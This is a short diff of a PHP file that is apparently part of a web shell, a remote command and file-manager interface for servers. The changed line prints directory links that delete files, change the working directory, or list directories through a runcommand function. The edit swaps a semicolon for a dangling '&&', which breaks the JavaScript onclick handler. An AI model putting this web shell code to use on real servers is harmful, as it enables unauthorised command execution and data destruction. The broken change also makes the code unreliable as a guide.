@@ -297,7 +297,7 @@ even require one :P
 			   
 			   foreach($dirs as $directory)
 			   {
-					print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($directory)."');\">[D]</i><i style=\"cursor:crosshair\" onclick=\"runcommand('changeworkdir ".realpath($directory)."','GET');\">[W]</i><b style=\"cursor:crosshair\" onclick=\"runcommand('clear','GET'); runcommand ('listdir ".realpath($directory)."','GET'); \">".$directory."</b><br>";
+					print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($directory)."');\">[D]</i><i style=\"cursor:crosshair\" onclick=\"runcommand('changeworkdir ".realpath($directory)."','GET');\">[W]</i><b style=\"cursor:crosshair\" onclick=\"runcommand('clear','GET'); runcommand ('listdir ".realpath($directory)."','GET') && \">".$directory."</b><br>";
 			   }
 			   
 			   print "</td><td>";
